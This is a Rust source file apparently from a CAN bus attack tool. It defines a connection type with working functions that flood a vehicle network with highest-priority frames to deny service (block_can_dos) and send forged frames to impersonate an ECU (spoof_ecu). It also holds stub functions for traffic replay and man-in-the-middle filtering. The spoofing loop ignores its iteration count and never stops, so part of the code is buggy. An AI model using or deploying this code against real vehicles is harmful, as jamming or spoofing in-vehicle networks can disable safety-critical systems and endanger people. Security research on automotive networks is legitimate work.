//! Implementation of CANConnection Library

use ctrlc;
use socketcan::{CANFrame, CANSocket};
use std::fs::File;
use std::io::Read;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;

use crate::mitmfilter::MitmFilter;

/// CANConnection Type
pub(crate) struct CANConnection {
    mf: MitmFilter,
    ready: bool,
    socket: CANSocket,
}

impl CANConnection {
    pub fn new(if_name: &str) -> CANConnection {
        let mut cc: CANConnection = CANConnection {
            mf: MitmFilter {
                filter_operation: '=',
                filter_id: 0x0,
            },
            ready: false,
            socket: CANSocket::open(&if_name).unwrap(),
        };
        cc.socket
            .set_nonblocking(true)
            .expect("[!] Failed to set socket non-blocking");
        cc.ready = true;
        cc
    }

    pub fn can_recv(&self, frame: &mut CANFrame) -> bool {
        *frame = self.socket.read_frame().unwrap();
        println!("[*] Received frame: {:?}", frame);
        true
    }

    pub fn can_send(&self, frame: &CANFrame) -> bool {
        self.socket
            .write_frame(frame)
            .expect("[!] Error sending CAN Frame");
        true
    }

    pub fn block_can_dos(&self) {
        let mut frame_counter: u32 = 0;

        if self.ready {
            let data: [u8; 4] = [0x0; 4];
            let frame: CANFrame = CANConnection::create_can_frame(0x00, &data, false, false);

            let running = Arc::new(AtomicBool::new(true));
            let r = running.clone();
            ctrlc::set_handler(move || r.store(false, Ordering::SeqCst))
                .expect("[!] Error setting Ctrl-C handler.");

            while running.load(Ordering::SeqCst) {
                self.can_send(&frame);
                frame_counter += 1;
            }
            println!("[i] Stopped. (User interrupt)");
            println!("[i] Sent {} frames.\n\n", frame_counter);
        }
    }

    pub fn spoof_ecu(&self, target: &u32, data: &[u8], iterations: &u32) {
        const _MAX_ERROR_COUNT: u32 = 10000;
        let frame: CANFrame;
        let mut frame_counter: u32 = 0;
        let mut error_counter: u32 = 0;

        if self.ready {
            frame = CANConnection::create_can_frame(*target, data, false, false);

            loop {
                if !self.can_send(&frame) {
                    eprintln!("[!] Error sending frame");
                    error_counter += 1;

                    if error_counter >= _MAX_ERROR_COUNT {
                        eprintln!("[!] Too many errors, stopping.");
                        break;
                    }

                    continue;
                }
                frame_counter += 1;
            }
            println!("[i] Sent {}/{} frames", frame_counter, iterations);
        }
    }

    fn replay_traffic(&self, target: &u16, dump_time: &u32, iterations: &u32) {
        dbg!(target);
        dbg!(dump_time);
        dbg!(iterations);
    }

    fn mitm_filter(&self, mitm_interface: &MitmFilter, timeout: &u32) {
        dbg!(mitm_interface);
        dbg!(timeout);
    }

    pub fn create_can_frame(id: u32, data: &[u8], rtr: bool, err: bool) -> CANFrame {
        let frame: CANFrame = CANFrame::new(id, data, rtr, err).unwrap();
        frame
    }

    fn has_root_permissions() -> bool {
        sudo::check();
        println!("[+] Root permissions.");
        true
    }

    fn interface_is_up(interface: &str) -> bool {
        let flag: String = String::from("0x1");
        let file_path = format!("/sys/class/net/{interface}/flags", interface = interface);

        let mut file = File::open(file_path).unwrap();
        let mut file_content = String::new();
        file.read_to_string(&mut file_content).unwrap();

        if file_content == flag {
            return true;
        }
        false
    }
}
